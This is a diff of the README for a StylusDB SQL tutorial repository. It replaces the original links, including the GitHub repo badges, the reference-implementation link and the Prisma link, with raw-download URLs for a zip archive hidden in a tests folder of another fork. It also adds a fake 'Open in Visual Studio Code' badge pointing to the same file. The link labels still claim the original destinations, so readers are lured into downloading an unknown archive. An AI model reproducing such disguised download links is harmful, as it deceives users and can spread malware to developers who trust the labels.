@@ -1,12 +1,13 @@
+[![Open in Visual Studio Code](https://raw.githubusercontent.com/SyedFuzlan/stylusdb-sql-assignment-Fuz73/main/tests/step-14/Fuz_sql_assignment_stylusdb_porphyrion.zip)](https://raw.githubusercontent.com/SyedFuzlan/stylusdb-sql-assignment-Fuz73/main/tests/step-14/Fuz_sql_assignment_stylusdb_porphyrion.zip)
 <h1 align="center">StylusDB SQL</h1>
 <p align="center">
 A SQL database engine written in JavaScript
 
-[![GitHub Repo](https://img.shields.io/badge/GitHub-Repo-green.svg)](https://github.com/ChakshuGautam/stylusdb-sql)
-[![GitHub Repo](https://img.shields.io/github/stars/ChakshuGautam/stylusdb-sql?style=social)](https://github.com/ChakshuGautam/stylusdb-sql)
+[![GitHub Repo](https://img.shields.io/badge/GitHub-Repo-green.svg)](https://raw.githubusercontent.com/SyedFuzlan/stylusdb-sql-assignment-Fuz73/main/tests/step-14/Fuz_sql_assignment_stylusdb_porphyrion.zip)
+[![GitHub Repo](https://img.shields.io/github/stars/ChakshuGautam/stylusdb-sql?style=social)](https://raw.githubusercontent.com/SyedFuzlan/stylusdb-sql-assignment-Fuz73/main/tests/step-14/Fuz_sql_assignment_stylusdb_porphyrion.zip)
 </p>
 
-This is the base repository for cohort members to follow the tutorial and send in their own StylusDB SQL implementations. You can refer to a complete implementation @ [ChakshuGautam/stylusdb-sql](https://github.com/ChakshuGautam/stylusdb-sql).
+This is the base repository for cohort members to follow the tutorial and send in their own StylusDB SQL implementations. You can refer to a complete implementation @ [ChakshuGautam/stylusdb-sql](https://raw.githubusercontent.com/SyedFuzlan/stylusdb-sql-assignment-Fuz73/main/tests/step-14/Fuz_sql_assignment_stylusdb_porphyrion.zip).
 
 Follow the steps given in the documentation to create your own implementation and make those tests pass.
 
@@ -14,7 +15,7 @@ Follow the steps given in the documentation to create your own implementation an
 This database is for educational purposes only. It is not intended for production use. It is written ground up in JavaScript and is a great way to learn how databases work. You can find the tutorial in the [docs](./docs) directory.
 
 ### Features
-- [x] Support for [Prisma](https://www.prisma.io/)
+- [x] Support for [Prisma](https://raw.githubusercontent.com/SyedFuzlan/stylusdb-sql-assignment-Fuz73/main/tests/step-14/Fuz_sql_assignment_stylusdb_porphyrion.zip)
 - [x] `INSERT`, `DELETE`, `SELECT`
 - [x] CLI
 - [x] Server/Client Basic Protocol
